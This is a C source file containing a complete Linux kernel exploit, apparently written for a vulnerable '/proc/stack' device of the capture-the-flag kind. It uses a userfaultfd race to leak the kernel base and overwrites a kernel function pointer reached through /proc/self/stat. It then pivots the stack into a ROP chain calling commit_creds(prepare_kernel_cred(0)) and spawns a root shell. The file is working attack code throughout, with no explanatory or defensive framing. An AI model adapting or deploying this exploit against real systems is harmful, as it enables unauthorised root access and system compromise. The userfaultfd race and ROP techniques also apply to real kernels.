#define _GNU_SOURCE
#include<sched.h>
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
#include<sys/mman.h>
#include<string.h>
#include<sys/stat.h>
#include<sys/types.h>
#include<fcntl.h>
#include<errno.h>
#include<sys/wait.h>
#include<pthread.h>
#include<sys/syscall.h>
#include<sys/ioctl.h>
#include<linux/userfaultfd.h>
#include <poll.h>
#include <signal.h>

#define CMD_PUSH 0x57ac0001
#define CMD_POP  0x57ac0002
#define DEVICE_FILE "/proc/stack"
typedef unsigned long __attribute__((regparm(3)))(*commit_creds_func)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3)))(*prepare_kernel_cred_func)(unsigned long cred);
commit_creds_func commit_creds = (commit_creds_func) 0x69c10;
prepare_kernel_cred_func prepare_kernel_cred = (prepare_kernel_cred_func) 0x69e00;
unsigned long kernel_base;
unsigned long pivot=0x4a7871;
unsigned long swapgs=0x3ef24;
unsigned long iret=0x1d5c6;
unsigned long poprdi=0x34505;
unsigned long movrdirax=0x21f8fc;
unsigned long poprcx=0x38af4;
unsigned long rop_usermode=0x600a6a;
unsigned long native_write_cr3=0x3ee70;
unsigned long poprsi=0x47a8e;
/*
0xffffffff8121f8fc: mov rdi, rax
0xffffffff8121f8ff: cmp rcx, rsi
0xffffffff8121f902: ja 0x41f8ed
0xffffffff8121f904: pop rbp
0xffffffff8121f905: ret
*/
int fd,ufd,ffd;

int userfaultfd(int flags){
	return syscall(SYS_userfaultfd,flags);
}
void push(unsigned long addr){
	ioctl(fd,CMD_PUSH,addr);
}
void pop(unsigned long addr){
	ioctl(fd,CMD_POP,addr);
}
void privesc(){
	commit_creds(prepare_kernel_cred(0));
}
unsigned long user_cs,user_ss,user_rflags,user_rsp;
static void save_state()
{
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %3\n"
        "pushfq\n"
        "popq %2\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags), "=r"(user_rsp)
        :
        : "memory");
}
void getshell(){
	if(!getuid()){
		puts("[+] Priv esc successful!");
	}
	puts("[+] Shell1!!!!");
	char *args[]={"/bin/sh",NULL}; 
	execve("/bin/sh",args,NULL);
}

void clonefunc(void *addr){
	sleep(2);
	puts("clone started!");
	struct pollfd pollfd_s={.fd=ufd,.events=POLLIN};
	while(poll(&pollfd_s,1,0x10)>0){
		struct uffd_msg ufd_msg={0};
		read(ufd,&ufd_msg,sizeof(ufd_msg));
		unsigned long place=ufd_msg.arg.pagefault.address;
		if(place==0xdead000){
			printf("[+] got page fault at address %p, nice!\n",(void *)place);
			unsigned long kernel_leak=0;
			pop((unsigned long)&kernel_leak);
			kernel_base=kernel_leak-0x13be80;
			pivot+=kernel_base;	
			swapgs+=kernel_base;	
			iret+=kernel_base;	
			poprdi+=kernel_base;	
			movrdirax+=kernel_base;	
			poprcx+=kernel_base;	
			rop_usermode+=kernel_base;	
			native_write_cr3+=kernel_base;	
			poprsi+=kernel_base;	
			commit_creds=(commit_creds_func)(kernel_base+(unsigned long)commit_creds);
			prepare_kernel_cred=(prepare_kernel_cred_func)(kernel_base+(unsigned long)prepare_kernel_cred);
			printf("[+] Kernel base=%p\n",(void *)kernel_base);
			printf("[+] Kernel pivot=%p\n",(void *)pivot);
			printf("[+] ropusermode=%p\n",(void *)rop_usermode);
			ffd=open("/proc/self/stat",O_RDONLY);
			puts("[+] Allocated target kernel data structure!");
			puts("[+] Now releasing ufd to overwrite function ptr!");
			struct uffdio_copy ufd_cpy={.dst=(long)place,.src=(long)&pivot,.len=0x1000};
			int ret=ioctl(ufd,UFFDIO_COPY,&ufd_cpy);
			if(ret<0){
				printf("errno=%d\n",ret);
				printf("copy param=%ld\n",ufd_cpy.copy);
				perror("ioctl uffdio_copy");
				exit(EXIT_FAILURE);
			}
			break;
		}
	}
}

int prepareUFD(unsigned long addr,unsigned long size){
	ufd=userfaultfd(O_NONBLOCK);
	if (ufd==-1) {
		perror("[-] Userfaultfd failed!");
		exit(-1);
	}
	struct uffdio_api ufd_api={.api=UFFD_API,.features=0};
	if(ioctl(ufd,UFFDIO_API,&ufd_api)){
		perror("[-] ioctl uffdio_api failed!");
		exit(EXIT_FAILURE);
	}
	if(ufd_api.api!=UFFD_API){
		perror("[-] Unknown API version");
		exit(EXIT_FAILURE);
	}
	struct uffdio_range ufd_range={.start=addr,.len=size};
	struct uffdio_register ufd_reg={.range=ufd_range,.mode=UFFDIO_REGISTER_MODE_MISSING};
	if(ioctl(ufd,UFFDIO_REGISTER,&ufd_reg)){
		perror("[-] ioctl uffdio_register failed!");
		exit(EXIT_FAILURE);
	}
	if(ufd_reg.ioctls!=UFFD_API_RANGE_IOCTLS){
		perror("[-] unknown UFFD ioctls!");
		exit(EXIT_FAILURE);
	}
}
void exploit(){
	char tmp[0x100];
	save_state();
	unsigned long first=0xdeadbeefcafebabe;
	push((unsigned long)&first);
	unsigned long stackpivot=0x5d5b0010;
	unsigned long pagef=(unsigned long)mmap((void *)0xdead000,0x3000,PROT_EXEC|PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED,0,0);
	if (pagef==(unsigned long)MAP_FAILED) {
		perror("mmap");
		exit(-1);
	}
	prepareUFD(pagef,0x3000);
	unsigned long fakestack=(unsigned long)malloc(0x10000);
	pthread_t t1;
	pthread_create(&t1,NULL,clonefunc,pagef);
	ffd=open("/proc/self/stat",O_RDONLY);
	puts("[+] target allocated!");
	close(ffd);
	puts("[+] target freed to get uninitialized kernel address on heap!");
	push(pagef);
	puts("[*] lock released!");
	pthread_join(t1,NULL);
	mmap((void *)0x5d5ad000,0x6000,PROT_EXEC|PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED,0,0);
	memset((void *)0x5d5ad000,0,0x6000);
	unsigned long ropchain[]={poprdi,0,prepare_kernel_cred,poprcx,0,poprsi,1,movrdirax,0,commit_creds,
		rop_usermode,0,0,	
		getshell,user_cs,user_rflags,0x5d5ae000,user_ss};
	memcpy((void *)stackpivot,ropchain,sizeof(ropchain));
	puts("[*] RIP triggered?????");
	read(ffd,tmp,0x100);
}

int main(){
	setuid(0);
	if(!getuid()){
		puts("[+] root!");
		char *args[]={"/bin/sh",NULL}; 
		execve("/bin/sh",args,NULL);
	}
	fd=open(DEVICE_FILE,O_RDWR);
	exploit();
	close(fd);
	return 0;
}
